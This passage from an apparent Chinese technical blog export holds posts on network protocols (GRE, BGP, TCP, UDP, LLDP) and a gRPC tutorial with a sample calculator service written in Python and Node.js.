<li>GRE Header ：采用GRE协议对净荷数据进行封装所添加的报文头，包括封装层数、版本、乘客协议类型、校验和信息、Key信息等内容。添加GRE头后的报文称为GRE报文。对净荷数据进行封装的GRE协议，称为封装协议（Encapsulation Protocol）。</li>
<li>传输协议的报文头（Delivery header）：在GRE报文上添加的报文头，以便传输协议对GRE报文进行转发处理。传输协议（Delivery Protocol 或者 Transport Protocol）是指负责转发GRE报文的网络层协议。</li>
</ul>
<h2 id="IGP"><a href="#IGP" class="headerlink" title="IGP"></a>IGP</h2><h4 id="OSPF"><a href="#OSPF" class="headerlink" title="OSPF"></a>OSPF</h4><h4 id="IS-IS"><a href="#IS-IS" class="headerlink" title="IS-IS"></a>IS-IS</h4><h4 id="路由算法"><a href="#路由算法" class="headerlink" title="路由算法"></a>路由算法</h4><ul>
<li>最短路径树算法</li>
</ul>
<h2 id="BGP"><a href="#BGP" class="headerlink" title="BGP"></a>BGP</h2><h4 id="路由反射器-RR"><a href="#路由反射器-RR" class="headerlink" title="路由反射器 RR"></a>路由反射器 RR</h4><h4 id="路由与VPN"><a href="#路由与VPN" class="headerlink" title="路由与VPN"></a>路由与VPN</h4><h2 id="NetFlow"><a href="#NetFlow" class="headerlink" title="NetFlow"></a>NetFlow</h2><h2 id="MPLS-VPN"><a href="#MPLS-VPN" class="headerlink" title="MPLS VPN"></a>MPLS VPN</h2><h2 id="资源"><a href="#资源" class="headerlink" title="资源"></a>资源</h2><ul>
<li><a href="http://www.clnchina.com.cn/nextlevel/" target="_blank" rel="noopener">思科网络学习空间</a></li>
</ul>
<h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ul>
<li><a href="http://www.clnchina.com.cn/nextlevel/BGP-route-reflector.pdf" target="_blank" rel="noopener">教程|BGP技术：路由反射器|Ender.joe(周亚军)|RS CCIE,SP CCIE,思科认证讲师#34708</a></li>
<li><a href="http://www.h3c.com/cn/d_201901/1143179_30005_0.htm#_Toc533785111" target="_blank" rel="noopener">H3C|三层技术-IP业务配置指导|GRE简介</a></li>
<li><a href="https://ccieblog.co.uk/bgp/bgp-always-compare-med" target="_blank" rel="noopener">CCIE Blog|BGP Always-Compare-Med</a></li>
<li><a href="https://mp.weixin.qq.com/s/529xVBPQ4q6mnbJnKa8mPg" target="_blank" rel="noopener">河海大学提出一种使水下网络更可靠的路由方案 | Michelle Hampson  IEEE电气电子工程师学会</a></li>
<li><a href="https://mp.weixin.qq.com/s/qp3MYG__9DSw3nFPib-Nkg" target="_blank" rel="noopener">使用 RouterSploit 攻击路由器的方法介绍 | hackerbirder  看雪学院</a></li>
</ul>
]]></content>
      <categories>
        <category>工程技术</category>
      </categories>
  </entry>
  <entry>
    <title>计算机网络协议：TCP</title>
    <url>/2017/05/12/Protocol-TCP/</url>
    <content><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><ul>
<li>Transmission Control Protocol (TCP)  RFC 793</li>
</ul>
<a id="more"></a>
<h2 id="ABC"><a href="#ABC" class="headerlink" title="ABC"></a>ABC</h2><ul>
<li><a href="https://github.com/lukego/blog/issues/18" target="_blank" rel="noopener">Computer architecture for network engineers:TCP vs CPU</a></li>
</ul>
<h2 id="Application"><a href="#Application" class="headerlink" title="Application"></a>Application</h2><ol>
<li><a href="https://riboseyim.github.io/2016/09/01/AAA/" target="_blank" rel="noopener">OpenSource:LVS (基于LVS的AAA负载均衡架构实践)</a></li>
</ol>
<h3 id="Catalog-Protocol-网络协议"><a href="#Catalog-Protocol-网络协议" class="headerlink" title="Catalog:Protocol,网络协议"></a><a href="https://riboseyim.github.io/2017/05/26/Protocol/" target="_blank" rel="noopener">Catalog:Protocol,网络协议</a></h3><h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ul>
<li><a href="http://www.ruanyifeng.com/blog/2017/06/tcp-protocol.html" target="_blank" rel="noopener">阮一峰：TCP协议简介</a></li>
<li><a href="http://blog.csdn.net/dog250/article/details/72042516" target="_blank" rel="noopener">赵亚： 使用TCP时序图解释BBR拥塞控制算法的几个细节</a></li>
<li><p><a href="http://blog.csdn.net/dog250/article/details/6612496" target="_blank" rel="noopener">赵亚： TCP协议疑难杂症全景解析</a></p>
<blockquote>
<p>TCP/IP模型从下往上，功能增加，需要实现的设备减少，然而设备的复杂性却在增加，这样保证了成本的最小化，至于性能或者因素，靠软件来调节吧，TCP协议就是这样的软件，实际上最开始的时候，TCP并不考虑性能，效率，公平性，正是考虑了这些，TCP协议才复杂了起来。</p>
</blockquote>
</li>
<li><p><a href="http://dtrace.org/blogs/dap/2016/08/18/tcp-puzzlers/" target="_blank" rel="noopener">TCP puzzlers | Dave Pacheco’s Blog</a></p>
</li>
<li><a href="http://blog.codingnow.com/2016/03/skynet_tcp_package.html" target="_blank" rel="noopener">在 skynet 中处理 TCP 的分包 | 云风的BLOG</a></li>
<li><a href="http://cizixs.com/2017/07/27/understand-tcp-ip-network-stack" target="_blank" rel="noopener">理解 TCP/IP 网络栈 | Cizixs</a></li>
</ul>
]]></content>
      <categories>
        <category>工程技术</category>
      </categories>
      <tags>
        <tag>DevOps</tag>
        <tag>网络协议</tag>
      </tags>
  </entry>
  <entry>
    <title>计算机网络协议：UDP</title>
    <url>/2017/05/12/Protocol-UDP/</url>
    <content><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><ul>
<li>User Datagram Protocol (UDP)  RFC 768<a id="more"></a>
</li>
</ul>
<h2 id="ABC"><a href="#ABC" class="headerlink" title="ABC"></a>ABC</h2><h2 id="Application"><a href="#Application" class="headerlink" title="Application"></a>Application</h2><ul>
<li><a href="https://riboseyim.github.io/2016/11/04/Ganglia/" target="_blank" rel="noopener">OpenSource:Ganglia (基于Ganglia实现集群性能态势感知)</a></li>
<li><a href="https://ops.tips/blog/raw-dns-resolver-in-go/" target="_blank" rel="noopener">Writing DNS messages from scratch using Go</a><br>How to write a DNS message from zero and send it via UDP to a server.</li>
</ul>
<h2 id="故障诊断"><a href="#故障诊断" class="headerlink" title="故障诊断"></a>故障诊断</h2><ul>
<li><a href="http://cizixs.com/2018/01/13/linux-udp-packet-drop-debug" target="_blank" rel="noopener">Linux 系统 UDP 丢包问题分析思路</a></li>
</ul>
<h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ul>
<li><a href="http://cizixs.com/2017/08/21/docker-udp-issue" target="_blank" rel="noopener">docker 容器网络下 UDP 协议的一个问题 | Cizixs</a></li>
<li><a href="http://blog.codingnow.com/2016/03/reliable_udp.html" target="_blank" rel="noopener">可靠 UDP 传输 | 云风的BLOG</a></li>
<li><a href="https://mp.weixin.qq.com/s?__biz=MzA4MjkxMzMyNg==&amp;mid=207449461&amp;idx=1&amp;sn=b9eb7906c6a709493af2d52abfbfeca2&amp;scene=1%23rd" target="_blank" rel="noopener">1000,000 packets/s的挑战</a></li>
<li><a href="https://cizixs.com/2018/01/13/linux-udp-packet-drop-debug" target="_blank" rel="noopener">linux 系统 UDP 丢包问题分析思路</a></li>
</ul>
]]></content>
      <categories>
        <category>工程技术</category>
      </categories>
      <tags>
        <tag>DevOps</tag>
        <tag>网络协议</tag>
      </tags>
  </entry>
  <entry>
    <title>计算机远程通信协议：gRPC</title>
    <url>/2017/10/30/Protocol-gRPC/</url>
    <content><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><ul>
<li>一、远程调用技术简史:从 CORBA 到 gRPC</li>
<li>二、gRPC 简介</li>
<li>三、gRPC 示例代码</li>
</ul>
<span id="more"></span>
<h2 id="远程通信协议：从-CORBA-到-gRPC"><a href="#远程通信协议：从-CORBA-到-gRPC" class="headerlink" title="远程通信协议：从 CORBA 到 gRPC"></a>远程通信协议：从 CORBA 到 gRPC</h2><p>自从产业界发明机器联网的那一天就已经开始探索最优的远程通信机制。操作系统如 UNIX、Windows 和 Linux 等都有实现远程通信的内部协议，挑战在于如何向开发人员开放一个通信框架。</p>
<h2 id="一、远程调用技术简史"><a href="#一、远程调用技术简史" class="headerlink" title="一、远程调用技术简史"></a>一、远程调用技术简史</h2><p>在20世纪90年代，当 TCP/IP 协议日臻成熟变成网络通信的黄金标准时，焦点转移到跨平台通信 —— 一台计算机可以通过某种类型网络在另一台计算机上发起一个动作。例如如 CORBA、DCOM、Java RMI 技术，在核心网络基础设施之上创造了一个对开发者友好的抽象层。这些技术还试图发展出一套与开发语言无关的通信框架，这一点对于客户机/服务器体系结构至关重要。</p>
<p>随着本世纪初 Web 技术的演进，HTTP 逐渐演变为事实上的通信标准。HTTP 结合 XML 提供了一种自我描述、不依赖语言、与平台无关的远程通信框架。这种结合的成果是 SOAP 和 WSDL 标准，它们保证了在各种运行环境和平台之间实现互操作的标准化。</p>
<p>下一个冲击互联网的浪潮是 Web 编程。许多开发人员发现定义 SOAP 标准的 HTTP 和 XML 的组合过于严格。这时 JavaScript 和 JSON 开始流行了。Web 2.0 现象（API 发挥了关键作用）, JSON 替代 XML 成为首选的协议。HTTP 和 JSON 这对致命的组合，催生了一个新的非官方标准 REST 。SOAP 要求严格遵守标准和结构定义，仅局限于大型企业应用程序，而 REST 在当代开发人员中很受欢迎。</p>
<h4 id="1-1-HTTP-REST-和微服务"><a href="#1-1-HTTP-REST-和微服务" class="headerlink" title="1.1 HTTP, REST 和微服务"></a>1.1 HTTP, REST 和微服务</h4><p>归功于 JavaScript 框架，Node.js 以及文档数据库的发展，REST 在 Web 开发者中广受欢迎。许多应用程序开始基于 REST 实现 ，即使是内部序列化和通信模式领域。但 HTTP 是最有效的消息交换协议吗？即使在同一上下文、同一网络，或者是同一台机器上运行的服务之间？HTTP 的便捷性与高性能之间需要作出权衡，这促使我们回到问题的起点，寻找微服务架构中最优的通信框架。</p>
<p>进入 gRPC 时代 —— 来自谷歌，现代的轻量级通信协议。这是一个高性能的、开源的通用远程过程调用（RPC） 框架，它可以在多种开发语言、任何操作系统上运行。</p>
<p>gRPC 在推出的第一年内就被 CoreOS，Netflix，Square 和 Cockroach Labs 等机构采用。 CoreOS 团队的 Etcd，是一种分布式键/值存储服务，采用 gRPC 实现端通信。电信公司如 Cisco，Juniper 和 Arista 都使用 gRPC 实现数据流遥测和网络设备配置。</p>
<h4 id="1-2-什么是-gRPC"><a href="#1-2-什么是-gRPC" class="headerlink" title="1.2 什么是 gRPC ?"></a>1.2 什么是 gRPC ?</h4><p>当我第一次遇到 gRPC，它使我想到 CORBA。两个框架都基于语言无关的接口定义语言（IDL） 声明服务，通过特定的语言绑定实现。<br><img src="http://riboseyim-qiniu.riboseyim.com/OpenSource-gRPC.png" alt=""></p>
<p>CORBA 和 gRPC 二者的设计，都是为了使客户端相信服务器在同一台机器。客户机在桩（Stub）上调用一个方法（method），调用过程由底层协议透明地处理。</p>
<p>gRPC 的秘诀在于处理序列化的方式。gRPC 基于 Protocol Buffer，一个开源的用于结构化数据序列化机制，它是语言和平台无关的。Protocol Buffer  的描述非常详细，与 XML 类似。但是它们比其他的协议格式更小，更快，效率更高。任何需要序列化的自定义数据类型在 gRPC 被定义为一个 Protocol Buffer 。</p>
<p>Protocol Buffer 的最新版本是 proto3，支持多种开发语言的代码生成，Java , C++，Python，Ruby , Java Lite , JavaScript，Objective-C 和 C # 。当一个 Protocol Buffer 编译为一个特定的语言，它的访问器（setter 和 getter）为每个字段提供定义。</p>
<p>相比于 REST + JSON 组合 ，gRPC 提供更好的性能和安全性。它极大的促进了在客户端和服务器之间使用 SSL / TLS 进行身份验证和数据交换加密。</p>
<p>为什么微服务开发者需要使用 gRPC ？gRPC 采用 HTTP / 2 以支持高性能的、可扩展的 API 。报文使用二进制而不是文本通信可以保持载荷紧凑、高效。HTTP / 2 请求在一个 TCP 连接上可支持多路复用，允许多个消息并发传送而不影响网络资源利用率。gRPC 使用报头压缩（header compression ）来减少请求和响应的大小。</p>
<h2 id="二、gRPC-简介"><a href="#二、gRPC-简介" class="headerlink" title="二、gRPC 简介"></a>二、gRPC 简介</h2><h4 id="2-1-创建-gRPC-服务的流程"><a href="#2-1-创建-gRPC-服务的流程" class="headerlink" title="2.1 创建 gRPC 服务的流程"></a>2.1 创建 gRPC 服务的流程</h4><ol>
<li>在 Protocol Buffer (.proto) 文件中描述服务和载荷结构</li>
<li>从 .proto 文件生成 gRPC 代码</li>
<li>用一种开发语言实现服务端</li>
<li>创建一个客户端调用服务</li>
<li>运行服务端和客户端</li>
</ol>
<p><img src="http://riboseyim-qiniu.riboseyim.com/Arch_gRPC_Workflow.png" alt=""></p>
<p><strong>Note:Node.js 客户端不需要生成存根（Stub），只要 Protocol Buffer 文件是可访问的，它就可以直接与服务端对话。</strong></p>
<h2 id="三、gRPC-示例代码"><a href="#三、gRPC-示例代码" class="headerlink" title="三、gRPC 示例代码"></a>三、gRPC 示例代码</h2><p>为了进一步熟悉 gRPC，我们将用 Python 语言创建一个简单的计算服务。它将同时被一个 Python 客户端和一个 Node.js 客户端调用。以下测试示例运行在 Mac OS X 。</p>
<p>你可以从 GitHub 库 <a href="https://github.com/grpc/grpc/tree/master/examples">https://github.com/grpc/grpc/tree/master/examples</a> 访问源代码，在自己的机器上运行示例。</p>
<ul>
<li><p>环境准备</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">// 配置 Python gRPC</span><br><span class="line">python -m pip install virtualenv</span><br><span class="line">virtualenv venv</span><br><span class="line"><span class="built_in">source</span> venv/bin/activate</span><br><span class="line">python -m pip install --upgrade pip</span><br><span class="line"></span><br><span class="line">//安装 gRPC 和 gRPC Tools</span><br><span class="line">python -m pip install grpcio</span><br><span class="line">python -m pip install grpcio-tools</span><br><span class="line"></span><br><span class="line">// 配置 Node.js gRPC</span><br><span class="line">npm install grpc --global</span><br><span class="line"></span><br><span class="line">//创建目录</span><br><span class="line">mkdir Proto</span><br><span class="line">mkdir Server</span><br><span class="line">mkdir -p Client/Python</span><br><span class="line">mkdir -p Client/Node</span><br></pre></td></tr></table></figure>
</li>
<li><p>创建 Protocol Buffer 文件</p>
</li>
</ul>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">//Proto/Calc.proto</span></span><br><span class="line">syntax = <span class="string">&quot;proto3&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> calc;</span><br><span class="line"></span><br><span class="line">service Calculator &#123;</span><br><span class="line">  rpc Add (AddRequest) returns (AddReply) &#123;&#125;</span><br><span class="line">  rpc Substract (SubstractRequest) returns (SubstractReply) &#123;&#125;</span><br><span class="line">  rpc Multiply (MultiplyRequest) returns (MultiplyReply) &#123;&#125;</span><br><span class="line">  rpc Divide (DivideRequest) returns (DivideReply) &#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">message AddRequest&#123;</span><br><span class="line">  <span class="keyword">int32</span> n1=<span class="number">1</span>;</span><br><span class="line">  <span class="keyword">int32</span> n2=<span class="number">2</span>;</span><br><span class="line">&#125;</span><br><span class="line">message AddReply&#123;</span><br><span class="line">  <span class="keyword">int32</span> n1=<span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">message SubstractRequest&#123;</span><br><span class="line">  <span class="keyword">int32</span> n1=<span class="number">1</span>;</span><br><span class="line">  <span class="keyword">int32</span> n2=<span class="number">2</span>;</span><br><span class="line">&#125;</span><br><span class="line">message SubstractReply&#123;</span><br><span class="line">  <span class="keyword">int32</span> n1=<span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">message MultiplyRequest&#123;</span><br><span class="line">  <span class="keyword">int32</span> n1=<span class="number">1</span>;</span><br><span class="line">  <span class="keyword">int32</span> n2=<span class="number">2</span>;</span><br><span class="line">&#125;</span><br><span class="line">message MultiplyReply&#123;</span><br><span class="line">  <span class="keyword">int32</span> n1=<span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">message DivideRequest&#123;</span><br><span class="line">  <span class="keyword">int32</span> n1=<span class="number">1</span>;</span><br><span class="line">  <span class="keyword">int32</span> n2=<span class="number">2</span>;</span><br><span class="line">&#125;</span><br><span class="line">message DivideReply&#123;</span><br><span class="line">  float f1=<span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li><p>生成 Python 服务端和客户端代码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ python -m grpc.tools.protoc  --python_out=. --grpc_python_out=. --proto_path=. Calc.proto</span><br><span class="line">$ cp Calc_pb2.py ../Server</span><br><span class="line">$ cp Calc_pb2.py ../Client/Python</span><br><span class="line">$ cp Calc.proto ../Client/Node</span><br></pre></td></tr></table></figure>
</li>
<li><p>创建服务端</p>
</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Server/Calc_Server.py</span></span><br><span class="line"><span class="keyword">from</span> concurrent <span class="keyword">import</span> futures</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> grpc</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> Calc_pb2</span><br><span class="line"><span class="keyword">import</span> Calc_pb2_grpc</span><br><span class="line"></span><br><span class="line">_ONE_DAY_IN_SECONDS = <span class="number">60</span> * <span class="number">60</span> * <span class="number">24</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Calculator</span>(<span class="params">Calc_pb2.CalculatorServicer</span>):</span></span><br><span class="line"></span><br><span class="line"> <span class="function"><span class="keyword">def</span> <span class="title">Add</span>(<span class="params">self, request, context</span>):</span></span><br><span class="line">   <span class="keyword">return</span> Calc_pb2.AddReply(n1=request.n1+request.n2)</span><br><span class="line"></span><br><span class="line"> <span class="function"><span class="keyword">def</span> <span class="title">Substract</span>(<span class="params">self, request, context</span>):</span></span><br><span class="line">   <span class="keyword">return</span> Calc_pb2.SubstractReply(n1=request.n1-request.n2)</span><br><span class="line"></span><br><span class="line"> <span class="function"><span class="keyword">def</span> <span class="title">Multiply</span>(<span class="params">self, request, context</span>):</span></span><br><span class="line">   <span class="keyword">return</span> Calc_pb2.MultiplyReply(n1=request.n1*request.n2)</span><br><span class="line"></span><br><span class="line"> <span class="function"><span class="keyword">def</span> <span class="title">Divide</span>(<span class="params">self, request, context</span>):</span></span><br><span class="line">   <span class="keyword">return</span> Calc_pb2.DivideReply(f1=request.n1/request.n2)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">serve</span>():</span></span><br><span class="line"> server = grpc.server(futures.ThreadPoolExecutor(max_workers=<span class="number">10</span>))</span><br><span class="line"> Calc_pb2_grpc.add_CalculatorServicer_to_server(Calculator(), server)</span><br><span class="line"> server.add_insecure_port(<span class="string">&#x27;[::]:50050&#x27;</span>)</span><br><span class="line"> server.start()</span><br><span class="line"></span><br><span class="line"> <span class="keyword">try</span>:</span><br><span class="line">   <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">     time.sleep(_ONE_DAY_IN_SECONDS)</span><br><span class="line"> <span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">   server.stop(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line"> serve()</span><br></pre></td></tr></table></figure>
<ul>
<li><p>启动服务端</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python Calc_Server.py</span><br></pre></td></tr></table></figure>
</li>
<li><p>创建 Python 客户端</p>
</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Client/Python/Calc_Client.py</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> __future__ <span class="keyword">import</span> print_function</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> grpc</span><br><span class="line"><span class="keyword">import</span> Calc_pb2</span><br><span class="line"><span class="keyword">import</span> Calc_pb2_grpc</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">run</span>():</span></span><br><span class="line"> channel = grpc.insecure_channel(<span class="string">&#x27;localhost:50050&#x27;</span>)</span><br><span class="line"> stub = Calc_pb2_grpc.CalculatorStub(channel)</span><br><span class="line"></span><br><span class="line"> response = stub.Add(Calc_pb2.AddRequest(n1=<span class="number">20</span>,n2=<span class="number">10</span>))</span><br><span class="line"> <span class="built_in">print</span>(response.n1)</span><br><span class="line"> response = stub.Substract(Calc_pb2.SubstractRequest(n1=<span class="number">20</span>,n2=<span class="number">10</span>))</span><br><span class="line"> <span class="built_in">print</span>(response.n1)</span><br><span class="line"> response = stub.Multiply(Calc_pb2.MultiplyRequest(n1=<span class="number">20</span>,n2=<span class="number">10</span>))</span><br><span class="line"> <span class="built_in">print</span>(response.n1)</span><br><span class="line"> response = stub.Divide(Calc_pb2.DivideRequest(n1=<span class="number">20</span>,n2=<span class="number">10</span>))</span><br><span class="line"> <span class="built_in">print</span>(response.f1)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">  run()</span><br></pre></td></tr></table></figure>
<ul>
<li><p>创建 Node.js 客户端</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">//Client/Node/Calc_Client.js</span></span><br><span class="line"><span class="keyword">var</span> PROTO_PATH = <span class="string">&#x27;Calc.proto&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> grpc = <span class="built_in">require</span>(<span class="string">&#x27;grpc&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> calc_proto = grpc.load(PROTO_PATH).calc;</span><br><span class="line"><span class="keyword">var</span> params=&#123;<span class="attr">n1</span>:<span class="number">20</span>, <span class="attr">n2</span>:<span class="number">10</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">main</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"> <span class="keyword">var</span> client = <span class="keyword">new</span> calc_proto.Calculator(<span class="string">&#x27;localhost:50050&#x27;</span>,</span><br><span class="line">                                      grpc.credentials.createInsecure());</span><br><span class="line"></span><br><span class="line"> client.divide(params, <span class="function"><span class="keyword">function</span>(<span class="params">err, response</span>) </span>&#123;</span><br><span class="line">   <span class="built_in">console</span>.log(response.f1);</span><br><span class="line"> &#125;);</span><br><span class="line"></span><br><span class="line"> client.multiply(params, <span class="function"><span class="keyword">function</span>(<span class="params">err, response</span>) </span>&#123;</span><br><span class="line">   <span class="built_in">console</span>.log(response.n1);</span><br><span class="line"> &#125;);</span><br><span class="line"></span><br><span class="line"> client.substract(params, <span class="function"><span class="keyword">function</span>(<span class="params">err, response</span>) </span>&#123;</span><br><span class="line">   <span class="built_in">console</span>.log(response.n1);</span><br><span class="line"> &#125;);</span><br><span class="line"></span><br><span class="line"> client.add(params, <span class="function"><span class="keyword">function</span>(<span class="params">err, response</span>) </span>&#123;</span><br><span class="line">   <span class="built_in">console</span>.log(response.n1);</span><br><span class="line"> &#125;);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">main();</span><br></pre></td></tr></table></figure>
</li>
<li><p>启动客户端 Node.js/Python</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ python Calc_Client.py</span><br><span class="line">30</span><br><span class="line">10</span><br><span class="line">200</span><br><span class="line">2.0</span><br><span class="line"></span><br><span class="line">$ node Calc_Client.js</span><br><span class="line">30</span><br><span class="line">10</span><br><span class="line">200</span><br><span class="line">2.0</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h2 id="附表：gRPC-年谱"><a href="#附表：gRPC-年谱" class="headerlink" title="附表：gRPC 年谱"></a>附表：gRPC 年谱</h2><ul>
<li>2011 : Protocol Buffers 2 =&gt; language neutral for serializing structured data</li>
<li>2015 : Borg =&gt; Large-scale cluster management =&gt; Kubernetes</li>
<li>2015 : Stubby =&gt; A high performance RPC framework =&gt; gRPC</li>
<li>July 2016 : Protocol Buffers 3.0.0</li>
<li>Aug 2016 : gRPC 1.0 ready for production</li>
<li>Sept 2016 : Swift-protobuf</li>
<li>Jan 2017 : Grpc Swift</li>
<li>Apr 2017 : Google Endpoints =&gt; Manage gRPC APIs with Cloud Endpoints</li>
<li>Sept 2017 : gRPC 1.6.1</li>
<li>Sept 2017 : Protocol Buffers 3.4.1</li>
<li>Oct 2017 : Swift-protobuf 1.0</li>
<li>Oct 2017 : gRPC 1.7.0</li>
</ul>
<h2 id="扩展阅读"><a href="#扩展阅读" class="headerlink" title="扩展阅读"></a>扩展阅读</h2><ul>
<li><a href="https://riboseyim.github.io/2017/10/30/Protocol-gRPC/">计算机远程通信协议：从 CORBA 到 gRPC</a></li>
<li><a href="https://riboseyim.github.io/2017/07/23/CloudComputing/">Stack Overflow：2017年最赚钱的编程语言</a></li>
<li><a href="https://riboseyim.github.io/2017/12/21/Language-Auto-Generator/">玩转编程语言:构建自定义代码生成器</a></li>
<li><a href="https://riboseyim.github.io/2017/06/12/OpenSource-Kafka-Microservice/">基于Kafka构建事件溯源型微服务</a></li>
<li><a href="https://riboseyim.github.io/2016/08/15/OpenSource-Kafka/">LinkedIn 开源 Kafka Monitor</a></li>
<li><a href="https://riboseyim.github.io/2017/05/23/RestfulAPI/">基于Go语言快速构建一个RESTful API服务</a></li>
<li><a href="https://riboseyim.github.io/2017/05/24/Log/">应用程序开发中的日志管理(Go语言描述)</a></li>
</ul>
<h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ul>
<li><a href="https://thenewstack.io/grpc-lean-mean-communication-protocol-microservices/">Google’s gRPC: A Lean and Mean Communication Protocol for Microservices | 9 Sep 2016 7:30am, by Janakiram MSV</a></li>
<li><a href="https://speakerd.s3.amazonaws.com/presentations/34441cd016c14d0ebc9aab78c5317f08/gRPC_microservices_are_the_future__5_.pdf">gRPC microservices are the future ? | Golang Nantes Meetup 21 September 2017 | Cyrille 、Hemidy</a></li>
<li><a href="http://www.infoq.com/cn/news/2015/03/grpc-google-http2-protobuf">gRPC：Google开源的基于HTTP/2和ProtoBuf的通用RPC框架</a></li>
<li><a href="https://ipfans.github.io/2017/04/grpc-call-timeout/">gRPC调用超时控制</a></li>
<li><a href="https://stackoverflow.com/questions/43638397/how-to-use-etcd-in-service-discovery">How to use etcd service discovery with gRPC in Go? </a></li>
<li><a href="http://www.agiratech.com/building-high-performance-apis-go-grpc/">Building High Performance APIs In Go Using gRPC</a></li>
<li><a href="https://t.co/zxNzlk7kwC">tracing gRPC calls in #Golang with #Google Stackdriver</a></li>
<li><a href="https://outcrawl.com/getting-started-microservices-go-grpc-kubernetes/?utm_content=bufferedde1&amp;utm_medium=social&amp;utm_source=twitter.com&amp;utm_campaign=buffer">Getting Started with Microservices using Go, gRPC and Kubernetes</a></li>
</ul>
]]></content>
      <categories>
        <category>工程技术</category>
      </categories>
      <tags>
        <tag>DevOps</tag>
        <tag>Linux</tag>
        <tag>网络协议</tag>
        <tag>Developer</tag>
      </tags>
  </entry>
  <entry>
    <title>计算机网络协议 | Overview of Protocol</title>
    <url>/2017/05/26/Protocol/</url>
    <content><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><a id="more"></a>
<h2 id="一、网络协议大全"><a href="#一、网络协议大全" class="headerlink" title="一、网络协议大全"></a>一、网络协议大全</h2><h4 id="1-1-TCP"><a href="#1-1-TCP" class="headerlink" title="1.1 TCP"></a>1.1 <a href="https://riboseyim.github.io/2017/05/12/Protocol-TCP/" target="_blank" rel="noopener">TCP</a></h4><ul>
<li>Transmission Control Protocol (TCP)  RFC 793<h4 id="1-2-UDP"><a href="#1-2-UDP" class="headerlink" title="1.2 UDP"></a>1.2 <a href="https://riboseyim.github.io/2017/05/12/Protocol-UDP/" target="_blank" rel="noopener">UDP</a></h4></li>
<li>User Datagram Protocol (UDP)  RFC 768<h4 id="1-3-IP"><a href="#1-3-IP" class="headerlink" title="1.3 IP"></a>1.3 IP</h4></li>
<li><a href="https://riboseyim.github.io/2017/08/09/Protocol-IPv6/" target="_blank" rel="noopener">计算机网络协议：IPv6 与网络安全</a></li>
<li>IPv6 Routing Header RFC 1883</li>
<li>IPv6 Fragment Header RFC 1883</li>
<li>ICMP for IPv6 RFC 1883</li>
<li><p>VPC/RFB Protocol：绿盟安全审计系统 <a href="https://patents.google.com/patent/CN102821161B" target="_blank" rel="noopener">CN102821161B</a></p>
</li>
<li><p><strong>Star</strong> <a href="http://www.saminiir.com/lets-code-tcp-ip-stack-1-ethernet-arp/#tuntap-devices" target="_blank" rel="noopener">Let’s code a TCP/IP stack</a></p>
</li>
</ul>
<h4 id="1-4-Link-Layer"><a href="#1-4-Link-Layer" class="headerlink" title="1.4 Link Layer"></a>1.4 Link Layer</h4><p>链路层发现协议（Link Layer Discovery Protocol，LLDP）是一种数据链路层协议，网络设备可以通过在本地网络中发送LLDPDU（Link Layer Discovery Protocol Data Unit）来通告其他设备自身的状态。是一种能够使网络中的设备互相发现并通告状态、交互信息的协议。</p>
<ul>
<li><a href="http://www.ieee802.org/3/frame_study/0409/blatherwick_1_0409.pdf" target="_blank" rel="noopener">802.1AB Overview | Link Layer Discovery Protocol | IEEE 802.3 Frame Expansion Study Group<br>Ottawa | Sept 30, 2004</a></li>
<li><a href="https://www.cisco.com/c/zh_cn/support/docs/smb/switches/cisco-250-series-smart-switches/smb2767-configure-link-layer-discovery-protocol-lldp-port-settings-o.html" target="_blank" rel="noopener">配置链路层发现协议(LLDP)在交换机的端口设置 | Cisco</a>  </li>
</ul>
<h4 id="其它"><a href="#其它" class="headerlink" title="其它"></a>其它</h4><ul>
